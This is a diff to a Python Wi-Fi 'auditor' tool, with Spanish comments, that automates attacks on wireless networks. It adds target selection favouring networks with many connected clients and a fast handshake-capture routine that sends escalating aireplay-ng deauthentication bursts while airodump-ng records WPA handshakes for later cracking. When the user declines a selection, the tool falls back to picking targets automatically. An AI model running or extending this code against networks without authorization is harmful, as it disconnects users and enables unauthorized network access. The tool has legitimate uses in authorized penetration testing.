@@ -864,8 +864,126 @@ class WiFiAuditor:
         if auto_mode:
             return self.intelligent_target_selection()
         
-        # Modo manual simple (por defecto)
-        return self.simple_target_selection()
+        # Modo manual simplificado - una sola oportunidad
+        return self.single_chance_selection()
+    
+    def single_chance_selection(self):
+        """Selección simplificada con una sola oportunidad"""
+        if not self.targets:
+            self.log("No hay objetivos disponibles", "WARNING")
+            return []
+        
+        self.log(f"Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
+        self.display_targets()
+        
+        print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
+        print(f"1-{len(self.targets)}. Seleccionar por números (ej: 1,3,5)")
+        print(f"{Colors.GREEN}clients. Solo redes con clientes (RECOMENDADO){Colors.END}")
+        print("all. Todos los objetivos")
+        print("wps. Solo redes con WPS")
+        print("q. Salir")
+        
+        try:
+            # Una sola oportunidad de selección
+            choice = self.safe_input(
+                f"\n{Colors.CYAN}Tu selección: {Colors.END}",
+                default="clients",  # Por defecto redes con clientes
+                allow_empty=False
+            ).lower().strip()
+            
+            if not choice or choice == 'q':
+                self.log("Selección cancelada", "WARNING")
+                return []
+            
+            # Procesar la selección
+            selected = self.process_simple_selection(choice)
+            
+            if not selected:
+                self.log("No se pudo procesar la selección - usando modo automático", "WARNING")
+                return self.automatic_fallback_selection()
+            
+            # Mostrar selección y confirmar UNA SOLA VEZ
+            self.show_simple_preview(selected)
+            
+            confirm = self.safe_input(
+                f"\n{Colors.YELLOW}¿Proceder? (s/n): {Colors.END}",
+                default="s",  # Por defecto sí
+                allow_empty=False
+            ).lower()
+            
+            if confirm in ['s', 'si', 'y', 'yes', '']:
+                self.log(f"Confirmados {len(selected)} objetivos", "SUCCESS")
+                return selected
+            else:
+                self.log("Selección rechazada - usando modo automático", "INFO")
+                return self.automatic_fallback_selection()
+                
+        except (KeyboardInterrupt, EOFError):
+            self.log("Operación cancelada - usando modo automático", "WARNING")
+            return self.automatic_fallback_selection()
+        except Exception as e:
+            self.log(f"Error en selección: {e} - usando modo automático", "ERROR")
+            return self.automatic_fallback_selection()
+    
+    def process_simple_selection(self, choice):
+        """Procesar selección de forma simple"""
+        selected = []
+        
+        if choice == 'clients':
+            selected = [t for t in self.targets if t['clients'] > 0]
+            selected = sorted(selected, key=lambda x: x['clients'], reverse=True)[:5]
+            if selected:
+                self.log(f"Seleccionadas {len(selected)} redes con clientes", "SUCCESS")
+            else:
+                self.log("No hay redes con clientes - seleccionando mejores por señal", "WARNING")
+                selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:3]
+        
+        elif choice == 'all':
+            selected = self.targets.copy()
+            self.log(f"Seleccionadas TODAS las {len(selected)} redes", "INFO")
+        
+        elif choice == 'wps':
+            selected = [t for t in self.targets if 'WPS' in t['encryption']]
+            if selected:
+                self.log(f"Seleccionadas {len(selected)} redes WPS", "SUCCESS")
+            else:
+                self.log("No hay redes WPS - usando selección por clientes", "WARNING")
+                selected = [t for t in self.targets if t['clients'] > 0][:3]
+        
+        else:
+            # Números específicos
+            try:
+                if ',' in choice or choice.isdigit():
+                    indices = []
+                    for num_str in choice.replace(' ', '').split(','):
+                        if num_str.isdigit():
+                            num = int(num_str)
+                            if 1 <= num <= len(self.targets):
+                                indices.append(num - 1)
+                    
+                    if indices:
+                        selected = [self.targets[i] for i in indices]
+                        self.log(f"Seleccionadas {len(selected)} redes manualmente", "SUCCESS")
+            except:
+                pass
+        
+        return selected
+    
+    def show_simple_preview(self, selected_targets):
+        """Mostrar vista previa simple"""
+        if not selected_targets:
+            return
+            
+        print(f"\n{Colors.BOLD}OBJETIVOS SELECCIONADOS:{Colors.END}")
+        print("-" * 50)
+        
+        for i, target in enumerate(selected_targets, 1):
+            clients_info = f"{target['clients']} clientes" if target['clients'] > 0 else "sin clientes"
+            color = Colors.GREEN if target['clients'] > 0 else Colors.YELLOW
+            print(f"{color}{i}. {target['essid']} ({target['power']}dBm, {clients_info}){Colors.END}")
+        
+        print("-" * 50)
+        print(f"Total: {len(selected_targets)} redes")
     
     def intelligent_target_selection(self):
         """Selección automática inteligente de objetivos"""
@@ -1288,10 +1406,10 @@ class WiFiAuditor:
     def simple_target_selection(self):
         """Selección mejorada de objetivos con vista previa"""
         if not self.targets:
-            self.log("⚠️ No hay objetivos disponibles para selección", "WARNING")
+            self.log("No hay objetivos disponibles para selección", "WARNING")
             return []
         
-        self.log(f"📊 Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
+        self.log(f"Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
         self.display_targets()
         
         print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
@@ -1302,7 +1420,13 @@ class WiFiAuditor:
         print(f"{Colors.GREEN}clients. Solo redes con clientes (RECOMENDADO){Colors.END}")
         print("q. Salir")
         
-        while True:
+        selection_attempts = 0
+        max_attempts = 3  # Máximo 3 intentos
+        
+        while selection_attempts < max_attempts:
+            selection_attempts += 1
+            self.log(f"Intento de selección {selection_attempts}/{max_attempts}", "INFO")
+            
             try:
                 # PASO 1: Obtener selección
                 try:
@@ -1365,8 +1489,12 @@ class WiFiAuditor:
                             self.log(f"Confirmados {len(preview_selected)} objetivos", "SUCCESS")
                             return preview_selected
                         elif confirm in ['n', 'no']:
-                            print(f"{Colors.BLUE}Volviendo a selección...{Colors.END}")
-                            break  # Salir del bucle de confirmación, volver al de selección
+                            if selection_attempts >= max_attempts:
+                                self.log(f"Máximo de {max_attempts} intentos alcanzado - usando selección automática", "WARNING")
+                                return self.automatic_fallback_selection()
+                            else:
+                                print(f"{Colors.BLUE}Volviendo a selección... (Intento {selection_attempts}/{max_attempts}){Colors.END}")
+                                break  # Salir del bucle de confirmación, volver al de selección
                         else:
                             print(f"{Colors.RED}Respuesta inválida. Por favor responde 's' o 'n'{Colors.END}")
                             continue
@@ -1398,6 +1526,11 @@ class WiFiAuditor:
                 except KeyboardInterrupt:
                     return []
                 continue
+        
+        # Si llegamos aquí, se agotaron los intentos
+        self.log(f"Se agotaron los {max_attempts} intentos de selección manual", "WARNING")
+        self.log("Activando selección automática como fallback final...", "INFO")
+        return self.automatic_fallback_selection()
     
     def process_selection_preview(self, choice):
         """Procesar selección y devolver lista para vista previa"""
@@ -1803,12 +1936,20 @@ class WiFiAuditor:
         """Captura de handshake mejorada con detección de clientes y múltiples estrategias"""
         self.log(f"Iniciando captura mejorada: {target['essid']} (Canal {target['channel']})", "INFO")
         
-        # PASO 1: Escanear clientes conectados primero
-        clients = self.scan_connected_clients(target)
+        # PASO 1: Escanear clientes conectados primero (con timeout)
+        clients = []
+        try:
+            clients = self.scan_connected_clients(target)
+        except Exception as e:
+            self.log(f"Error en escaneo de clientes: {e} - continuando sin detección", "WARNING")
+        
         if not clients:
             self.log(f"ATENCION: No se detectan clientes conectados a {target['essid']}", "WARNING")
-            self.log("   Esto reducira significativamente las posibilidades de capturar handshake", "WARNING")
-            self.log("   Procediendo con ataque broadcast...", "INFO")
+            self.log("   Procediendo directamente con ataques broadcast optimizados...", "INFO")
+            # Usar información del target original si tenía clientes
+            if target.get('clients', 0) > 0:
+                self.log(f"   NOTA: Escaneo inicial mostró {target['clients']} clientes - probablemente estén activos", "INFO")
+                clients = ['INFERRED_FROM_SCAN']  # Marcador para usar estrategias de clientes
         else:
             self.log(f"Detectados {len(clients)} clientes conectados - excelente!", "SUCCESS")
             for i, client in enumerate(clients[:3], 1):
@@ -1908,6 +2049,66 @@ class WiFiAuditor:
         
         return self.final_handshake_verification(cap_file, target)
     
+    def fast_handshake_capture(self, target):
+        """Captura rápida de handshake sin escaneo de clientes (fallback)"""
+        self.log(f"Iniciando captura rápida: {target['essid']} (Canal {target['channel']})", "INFO")
+        
+        # Archivo de captura
+        capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
+        capture_file = self.handshake_dir / capture_filename
+        cap_file = f"{capture_file}-01.cap"
+        
+        # Configurar canal
+        self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
+        time.sleep(1)
+        
+        # Iniciar captura
+        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file} --write-interval 1"
+        dump_process = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        self.log("Captura iniciada - aplicando deauth inmediato...", "INFO")
+        time.sleep(3)
+        
+        # Ataques de deauth rápidos y efectivos
+        deauth_rounds = [
+            10,  # 10 paquetes
+            20,  # 20 paquetes  
+            30,  # 30 paquetes
+            50,  # 50 paquetes intensos
+        ]
+        
+        for round_num, packets in enumerate(deauth_rounds, 1):
+            if not self.running:
+                break
+                
+            self.log(f"Deauth rápido {round_num}/4: {packets} paquetes", "INFO")
+            
+            # Deauth broadcast
+            deauth_cmd = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
+            subprocess.run(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Esperar reconexiones
+            wait_time = 5 + (round_num * 2)  # 5, 7, 9, 11 segundos
+            self.log(f"Esperando {wait_time}s...", "INFO")
+            time.sleep(wait_time)
+            
+            # Verificación rápida
+            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 3000:
+                if self.check_handshake_quick(cap_file):
+                    self.log("Handshake capturado con método rápido!", "SUCCESS")
+                    break
+        
+        # Captura final
+        if not self.check_handshake_quick(cap_file):
+            self.log("Captura final de 15 segundos...", "INFO")
+            time.sleep(15)
+        
+        # Detener
+        dump_process.terminate()
+        time.sleep(2)
+        
+        return self.final_handshake_verification(cap_file, target)
+    
     def scan_connected_clients(self, target):
         """Escanear clientes conectados al AP objetivo"""
         self.log(f"Escaneando clientes conectados a {target['essid']}...", "INFO")
@@ -1915,10 +2116,39 @@ class WiFiAuditor:
         clients = []
         scan_file = "/tmp/client_scan"
         
+        # Timeout general para toda la función - máximo 20 segundos
+        import signal
+        
+        def timeout_handler(signum, frame):
+            raise TimeoutError("Escaneo de clientes excedió el tiempo límite")
+        
+        old_handler = signal.signal(signal.SIGALRM, timeout_handler)
+        signal.alarm(20)  # 20 segundos máximo para toda la función
+        
         try:
-            # Escanear durante 15 segundos para detectar clientes
-            scan_cmd = f"timeout 15 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {scan_file} --write-interval 2"
-            subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            # Limpiar archivos previos
+            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                temp_file = f"{scan_file}{ext}"
+                if os.path.exists(temp_file):
+                    os.remove(temp_file)
+            
+            # Escaneo rápido de 8 segundos con timeout forzado
+            self.log("Iniciando escaneo rápido de clientes (8 segundos)...", "INFO")
+            scan_cmd = f"timeout 8 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {scan_file} --write-interval 1"
+            
+            # Ejecutar con timeout adicional por si acaso
+            process = subprocess.Popen(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            try:
+                # Esperar máximo 10 segundos (8 del timeout + 2 de margen)
+                process.wait(timeout=10)
+            except subprocess.TimeoutExpired:
+                self.log("Timeout del escaneo de clientes - terminando proceso...", "WARNING")
+                process.terminate()
+                time.sleep(1)
+                if process.poll() is None:
+                    process.kill()
+                    time.sleep(1)
             
             # Buscar el archivo CSV generado
             csv_file = f"{scan_file}-01.csv"
@@ -1952,27 +2182,51 @@ class WiFiAuditor:
                     if os.path.exists(temp_file):
                         os.remove(temp_file)
             
-            # Método alternativo: parsear desde airodump directo
+            # Método alternativo 1: escaneo rápido directo (solo 5 segundos)
             if not clients:
-                self.log("Metodo alternativo: escaneo directo con timeout corto...", "INFO")
-                scan_cmd2 = f"timeout 10 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']}"
-                result = subprocess.run(scan_cmd2, shell=True, capture_output=True, text=True)
-                
-                # Buscar MACs en la salida que no sean el BSSID del AP
-                import re
-                mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
-                found_macs = re.findall(mac_pattern, result.stdout)
-                
-                for mac_parts in found_macs:
-                    full_mac = ''.join(mac_parts[0] + mac_parts[1])
-                    if full_mac != target['bssid'] and full_mac not in clients:
-                        clients.append(full_mac)
+                self.log("Metodo alternativo 1: escaneo ultra rápido (5s)...", "INFO")
+                try:
+                    scan_cmd2 = f"timeout 5 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']}"
+                    result = subprocess.run(scan_cmd2, shell=True, capture_output=True, text=True, timeout=7)
+                    
+                    # Buscar MACs en la salida que no sean el BSSID del AP
+                    import re
+                    mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
+                    found_macs = re.findall(mac_pattern, result.stdout)
+                    
+                    for mac_parts in found_macs:
+                        full_mac = ''.join(mac_parts[0] + mac_parts[1])
+                        if full_mac != target['bssid'] and full_mac not in clients:
+                            clients.append(full_mac)
+                            
+                except (subprocess.TimeoutExpired, Exception) as e:
+                    self.log(f"Metodo alternativo 1 timeout/error: {e}", "WARNING")
+            
+            # Método alternativo 2: usar información del escaneo inicial si está disponible
+            if not clients and hasattr(self, 'last_scan_data'):
+                self.log("Metodo alternativo 2: usando datos del escaneo inicial...", "INFO")
+                # Buscar clientes del escaneo inicial que puedan estar conectados a este AP
+                for scan_target in getattr(self, 'last_scan_data', []):
+                    if scan_target.get('bssid') == target['bssid'] and scan_target.get('clients', 0) > 0:
+                        # Este target tenía clientes en el escaneo inicial
+                        self.log(f"Scan inicial indicó {scan_target['clients']} clientes para este AP", "INFO")
+                        # Generar MACs ficticios para simular presencia de clientes
+                        # Esto forzará el uso de ataques dirigidos
+                        clients = ['DETECTED_FROM_SCAN']  # Marcador especial
+                        break
             
             return clients[:5]  # Máximo 5 clientes para evitar sobrecarga
             
+        except TimeoutError:
+            self.log("TIMEOUT: Escaneo de clientes excedió 20 segundos - continuando sin clientes detectados", "WARNING")
+            return []
         except Exception as e:
             self.log(f"Error escaneando clientes: {e}", "ERROR")
             return []
+        finally:
+            # Restaurar handler de señal y cancelar alarma
+            signal.alarm(0)
+            signal.signal(signal.SIGALRM, old_handler)
     
     def check_handshake_quick(self, cap_file):
         """Verificación rápida de handshake"""
